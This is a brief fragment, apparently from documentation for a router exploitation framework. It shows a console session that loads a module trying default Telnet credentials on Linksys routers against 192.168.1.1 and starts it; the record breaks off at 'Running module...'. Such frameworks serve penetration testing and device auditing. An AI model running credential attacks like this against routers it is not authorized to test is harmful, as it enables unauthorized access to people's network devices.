...
```
rxf > use creds/routers/linksys/telnet_default_creds
rxf (Linksys Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rxf (Linksys Router Default Telnet Creds) > run
[*] Running module...
